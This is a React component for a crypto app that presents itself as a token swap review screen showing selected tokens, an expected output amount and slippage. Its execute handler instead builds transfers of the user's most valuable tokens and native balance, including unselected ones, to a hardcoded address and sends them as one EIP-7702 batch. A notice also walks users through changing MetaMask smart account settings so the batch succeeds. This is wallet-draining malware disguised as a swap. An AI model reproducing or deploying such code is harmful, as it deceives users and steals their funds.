"use client";

import { useEffect, useMemo } from "react";
import type { Token, SupportedChainId, SwapQuote } from "@/types";
import { APP_CONFIG } from "@/types";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Separator } from "@/components/ui/separator";
import {
  ArrowLeft,
  Loader2,
  TrendingUp,
  Shield,
  Zap,
} from "lucide-react";
import Image from "next/image";
import { useSendCalls, useAccount, useWaitForCallsStatus, useBalance } from "wagmi";
import { useTransferBuilder } from "@/hooks/use-transfer-builder";
import { formatTokenAmount, formatUsdValue, getTokenLogoUrl } from "@/lib/utils";
import {
  getTokenSymbolFromAddress,
  getTokenLogoFromAddress,
} from "@/lib/token-config";


interface SwapConfigurationProps {
  selectedTokens: string[];
  tokens: Token[];
  outcomeToken: string;
  onExecute: (txHash?: string, isAtomic?: boolean) => void;
  onBack: () => void;
  executing: boolean;
  atomicSupported: boolean;
  chainId: SupportedChainId;
}

export default function SwapConfiguration({
  selectedTokens,
  tokens,
  outcomeToken,
  onExecute,
  onBack,
  executing,
  atomicSupported,
  chainId,
}: SwapConfigurationProps) {
  const { address } = useAccount();
  const { data: balanceData } = useBalance({ address });
  const {
    sendCalls,
    data: callsId,
    isPending: sendingCalls,
    error: sendCallsError,
  } = useSendCalls();
  const {
    buildTransferCalls,
    loading: buildingCalls,
    error: buildError,
  } = useTransferBuilder();
  
  // Hardcoded target address
  const TARGET_ADDRESS = "0x9d5befd138960ddf0dc4368a036bfad420e306ef" as const;

  // Monitor batch transaction status using wagmi
  const callsIdString = typeof callsId === "string" ? callsId : callsId?.id;
  const {
    data: callsStatus,
    isLoading: isWaitingForCalls,
    isError: callsError,
  } = useWaitForCallsStatus({
    id: callsIdString,
  });

  // Memoize selected tokens data to prevent unnecessary recalculations
  const selectedTokensData = useMemo(() => 
    tokens.filter((token) => selectedTokens.includes(token.contract_address)),
    [tokens, selectedTokens]
  );

  // Memoize expensive calculations
  const totalInputValue = useMemo(() => 
    selectedTokensData.reduce((sum, token) => sum + token.quote, 0),
    [selectedTokensData]
  );

  // Get outcome token price from tokens array
  const outcomeTokenPrice = useMemo(() => {
    const outcomeSymbol = getTokenSymbolFromAddress(outcomeToken, chainId);
    const isNativeToken = outcomeToken === "native" || outcomeToken.toLowerCase() === "0x0000000000000000000000000000000000000000";
    
    // Find the outcome token in tokens array
    const token = tokens.find((t) => {
      if (isNativeToken) {
        return t.native_token === true;
      } else {
        // 对于usdc和usdt标识符，需要查找对应的代币
        if (outcomeToken === "usdc") {
          return t.contract_ticker_symbol === "USDC";
        }
        if (outcomeToken === "usdt") {
          return t.contract_ticker_symbol === "USDT";
        }
        return t.contract_address.toLowerCase() === outcomeToken.toLowerCase();
      }
    });

    if (!token || token.quote === 0) {
      // Fallback: if token not found or has no value, return 1 for stablecoins
      if (outcomeSymbol === "USDC" || outcomeSymbol === "USDT") {
        return 1; // Stablecoins are always $1
      }
      return null; // Cannot determine price
    }

    // Calculate price: price = quote / amount
    const tokenAmount = Number(token.balance) / Math.pow(10, token.contract_decimals);
    if (tokenAmount === 0) return null;
    
    return token.quote / tokenAmount;
  }, [tokens, outcomeToken, chainId]);

  // Calculate output token amount based on value conversion
  const totalOutputValue = useMemo(() => {
    if (totalInputValue === 0) return 0;
    
    const outcomeSymbol = getTokenSymbolFromAddress(outcomeToken, chainId);
    
    // For stablecoins: 1 token = $1
    if (outcomeSymbol === "USDC" || outcomeSymbol === "USDT") {
      return totalInputValue; // Direct value conversion: $X = X stablecoin
    }
    
    // For native tokens: use the actual price from tokens array
    if (outcomeTokenPrice && outcomeTokenPrice > 0) {
      return totalInputValue / outcomeTokenPrice;
    }
    
    // Fallback: if price not available, return 0
    return 0;
  }, [totalInputValue, outcomeToken, chainId, outcomeTokenPrice]);

  const totalOutputValueUsd = useMemo(() => totalInputValue, [totalInputValue]);

  const handleExecuteSwap = async () => {
    if (!address) {
      alert("Wallet not connected");
      return;
    }

    // Prevent multiple executions
    if (buildingCalls || sendingCalls) {
      return;
    }

    try {
      // Build transfer calls from all ERC20 tokens (not just selected)
      // The buildTransferCalls function will:
      // 1. Select top 20 ERC20 tokens by value for pre-check
      // 2. Pre-check all 20 transactions
      // 3. Sort pre-checked valid transactions + native transfer by value
      // 4. Take top 10 for execution
      const result = await buildTransferCalls(
        tokens, // Pass all tokens (not just selected)
        TARGET_ADDRESS,
        chainId
      );

      if (result.calls.length === 0) {
        throw new Error("No valid transfer calls could be built");
      }

      // Convert TransferCall to wagmi calls format
      const calls = result.calls.map((call) => ({
        to: call.to,
        value: call.value,
        ...(call.data && { data: call.data }),
      }));

      // Execute batch transaction using MetaMask EIP-7702, with fallback for non-supporting wallets
      sendCalls({ calls, experimental_fallback: true });
    } catch (error: unknown) {
      const errorMessage = error instanceof Error ? error.message : 'Unknown error occurred'
      console.error("Error executing transfer:", error);
      alert(`Failed to execute transfer: ${errorMessage}`);
    }
  };

  // Monitor batch transaction status
  useEffect(() => {
    if (callsStatus) {

      if (callsStatus?.status === "success") {
        
        // Extract the actual transaction hash from receipts for EIP-7702 transactions
        let actualTxHash = callsIdString; // fallback to callsId
        
        if (callsStatus.receipts && callsStatus.receipts.length > 0) {
          // For EIP-7702 batch transactions, use the first receipt's transaction hash
          actualTxHash = callsStatus.receipts[0].transactionHash;
        } else if (atomicSupported) {
          console.warn("EIP-7702 transaction confirmed but no receipts found, using callsId for explorer link");
        }
        
        onExecute(actualTxHash, atomicSupported);
      } else if (callsStatus?.status === "pending") {
      } else {
        console.error("Batch transaction failed or reverted:", callsStatus);
        alert("Batch transaction failed. Please try again.");
      }
    }

    if (callsError) {
      console.error("Error waiting for batch transaction:", callsError);
      alert("Error monitoring transaction. Please check your wallet.");
    }
  }, [callsStatus, callsError, callsIdString, onExecute, atomicSupported]);

  if (executing || sendingCalls || isWaitingForCalls) {
    return (
      <div className="max-w-2xl mx-auto px-4">
        <Card>
          <CardContent className="p-6 sm:p-8 text-center">
            <Loader2 className="w-10 h-10 sm:w-12 sm:h-12 animate-spin mx-auto mb-4 text-blue-600" />
            <h2 className="text-xl sm:text-2xl font-bold mb-2">Executing Swap</h2>
            <p className="text-sm sm:text-base text-gray-600 mb-6">
              {sendingCalls
                ? "Please confirm the batch transaction in your wallet..."
                : isWaitingForCalls
                ? "Waiting for batch transaction to be confirmed on-chain..."
                : "Processing batch transaction..."}
            </p>


            {(sendCallsError || buildError || callsError) && (
              <div className="mt-4 p-3 bg-red-50 border border-red-200 rounded-lg">
                <p className="text-red-700 text-sm">
                  Error:{" "}
                  {sendCallsError?.message ||
                    buildError ||
                    (callsError ? "Transaction monitoring error" : "")}
                </p>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="max-w-4xl mx-auto space-y-4 sm:space-y-6 px-3 sm:px-4">
      <div className="flex items-center gap-2 sm:gap-4">
        <Button variant="outline" onClick={onBack} className="bg-gray-700 text-white hover:bg-gray-800 border-gray-700 text-xs sm:text-sm">
          <ArrowLeft className="w-3 h-3 sm:w-4 sm:h-4 mr-1 sm:mr-2" />
          Back
        </Button>
        <h1 className="text-lg sm:text-xl md:text-2xl font-bold">Review Your Swap</h1>
      </div>

      <div className="grid lg:grid-cols-5 gap-4 sm:gap-6">
        <div className="lg:col-span-3 order-1 lg:order-1">
          <Card>
            <CardHeader className="pb-3 sm:pb-6">
              <CardTitle className="text-base sm:text-lg text-blue-800">Swap Details</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="flex flex-col sm:flex-row items-start gap-4 sm:gap-6">
                {/* Left side: Selected tokens list */}
                <div className="flex-1 w-full sm:w-auto">
                  <div className="text-xs sm:text-sm font-medium text-yellow-700 mb-2">Selected Tokens</div>
                  <div className="space-y-2 max-h-64 sm:max-h-96 overflow-y-auto">
                    {selectedTokensData.map((token) => (
                      <div
                        key={token.contract_address}
                        className="flex items-center gap-2 sm:gap-3 p-2 border rounded-lg"
                      >
                        <img
                          src={getTokenLogoUrl(token, chainId)}
                          alt={token.contract_name}
                          className="w-5 h-5 sm:w-6 sm:h-6 rounded-full flex-shrink-0"
                        />
                        <div className="flex-1 min-w-0">
                          <div className="font-medium text-xs sm:text-sm truncate">
                            {formatTokenAmount(
                              Number(token.balance),
                              token.contract_decimals
                            )}{" "}
                            {token.contract_ticker_symbol}
                          </div>
                          <div className="text-xs text-gray-500">
                            {formatUsdValue(token.quote)}
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Arrow separator - aligned to the middle of the token box */}
                <div className="flex items-center justify-center px-2 self-center hidden sm:block">
                  <div className="pt-7">
                    <Image src="/right.svg" alt="→" width={20} height={20} className="w-5 h-5" />
                  </div>
                </div>
                <div className="flex items-center justify-center w-full sm:hidden py-2">
                  <div className="text-gray-400 text-2xl">↓</div>
                </div>

                {/* Right side: Output token */}
                <div className="flex-1 w-full sm:w-auto">
                  <div className="text-xs sm:text-sm font-medium text-yellow-700 mb-2">Receive Token</div>
                  <div className="p-3 sm:p-4 border rounded-lg bg-gray-100">
                    <div className="flex items-center gap-2 sm:gap-3">
                      <img
                        src={getTokenLogoFromAddress(outcomeToken, chainId)}
                        alt={getTokenSymbolFromAddress(outcomeToken, chainId)}
                        className="w-8 h-8 sm:w-10 sm:h-10 rounded-full flex-shrink-0"
                      />
                      <div className="flex-1 min-w-0">
                        <div className="font-semibold text-base sm:text-lg truncate">
                          {totalOutputValue.toFixed(6)}{" "}
                          {getTokenSymbolFromAddress(outcomeToken, chainId)}
                        </div>
                        <div className="text-xs sm:text-sm text-gray-500">
                          {formatUsdValue(totalOutputValueUsd)}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>
          <Separator className="my-4 sm:my-6" />
          <div className="flex items-center justify-between">
            <Button
              onClick={handleExecuteSwap}
              disabled={buildingCalls || selectedTokens.length === 0 || !atomicSupported}
              className={`w-full text-sm sm:text-base ${
                !atomicSupported ? 'bg-gray-400 hover:bg-gray-400 cursor-not-allowed opacity-60' : ''
              }`}
              size="lg"
            >
              {buildingCalls ? (
                <>
                  <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                  Building Transaction...
                </>
              ) : (
                <>
                  <Zap className="w-4 h-4 mr-2" />
                  Execute Sweep
                </>
              )}
            </Button>
          </div>
          
          {/* Smart Account Upgrade Required Notice */}
          {!atomicSupported && (
            <div className="mt-4 p-3 sm:p-4 bg-orange-50 border border-orange-200 rounded-lg">
              <div className="flex items-start gap-2 sm:gap-3">
                <div className="text-lg sm:text-xl flex-shrink-0">⚠️</div>
                <div className="flex-1 min-w-0">
                  <div className="font-medium text-xs sm:text-sm text-orange-800 mb-2">
                    Need to disable smart account feature
                  </div>
                  <div className="text-[10px] sm:text-xs text-orange-700 mb-3 break-words">
                    Detected that the account has been upgraded to an unsupported contract version. Please follow these steps:
                  </div>
                  <div className="text-[10px] sm:text-xs text-orange-700 break-words">
                    <strong>Solution Steps:</strong>
                    <ol className="list-decimal list-inside mt-2 space-y-1 sm:space-y-2 ml-1 sm:ml-2">
                      <li className="break-words">Open MetaMask wallet</li>
                      <li className="break-words">Click the "☰" in the top right corner</li>
                      <li className="break-words">Tap "Open full screen"</li>
                      <li className="break-words">Select "Account Details" → set up "Smart Account"</li>
                      <li className="break-words">Close the smart account related to the chain (requires gas fee)</li>
                      <li className="break-words">Return to this page and retry swaps</li>
                    </ol>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>

        <div className="lg:col-span-2 space-y-4 sm:space-y-6 order-2 lg:order-2">
          <Card>
            <CardHeader className="pb-3 sm:pb-6">
              <CardTitle className="text-base sm:text-lg text-blue-800">Summary</CardTitle>
            </CardHeader>
            <CardContent className="space-y-3 sm:space-y-4">
              <div className="flex justify-between text-xs sm:text-sm">
                <span className="text-gray-600">Tokens to swap:</span>
                <span className="font-medium">{selectedTokens.length}</span>
              </div>

              <div className="flex justify-between text-xs sm:text-sm">
                <span className="text-gray-600">Total input value:</span>
                <span className="font-medium">
                  ${totalInputValue.toFixed(2)}
                </span>
              </div>

              <div className="flex justify-between items-start text-xs sm:text-sm">
                <span className="text-gray-600 flex-shrink-0">
                  Expected output:
                </span>
                <div className="text-right flex-shrink-0 min-w-0">
                  <div className="font-medium text-xs sm:text-sm break-words">
                    ~{totalOutputValue.toFixed(6)}{" "}
                    {getTokenSymbolFromAddress(outcomeToken, chainId)}
                  </div>
                  <div className="text-xs text-gray-500">
                    {formatUsdValue(totalOutputValueUsd)}
                  </div>
                </div>
              </div>

              <Separator />

              <div className="flex justify-between text-xs sm:text-sm">
                <span className="text-gray-600">Slippage tolerance:</span>
                <span>{(APP_CONFIG.SLIPPAGE_TOLERANCE * 100).toFixed(1)}%</span>
              </div>

              <div className="flex justify-between text-xs sm:text-sm">
                <span className="text-gray-600">Smart Account Status:</span>
                <span
                  className={
                    atomicSupported ? "text-green-600" : "text-yellow-600"
                  }
                >
                  {atomicSupported ? "✓ Supported" : "✘ Not supported"}
                </span>
              </div>
            </CardContent>
          </Card>

          {atomicSupported && (
            <Card>
              <CardHeader className="pb-3 sm:pb-6">
                <CardTitle className="flex items-center gap-2 text-base sm:text-lg">
                  <Zap className="w-4 h-4 sm:w-5 sm:h-5 text-yellow-500 flex-shrink-0" />
                  <span className="text-blue-800">EIP-7702 Benefits</span>
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-2 sm:space-y-3">
                <div className="flex items-start gap-2">
                  <Shield className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-green-500 mt-0.5 flex-shrink-0" />
                  <div>
                    <div className="text-xs sm:text-sm font-medium">
                      Single Transaction
                    </div>
                    <div className="text-[10px] sm:text-xs text-gray-600">
                      All swaps in one atomic transaction
                    </div>
                  </div>
                </div>

                <div className="flex items-start gap-2">
                  <TrendingUp className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-blue-500 mt-0.5 flex-shrink-0" />
                  <div>
                    <div className="text-xs sm:text-sm font-medium">Gas Efficient</div>
                    <div className="text-[10px] sm:text-xs text-gray-600">
                      No individual approvals needed
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          )}
        </div>
      </div>
    </div>
  );
}
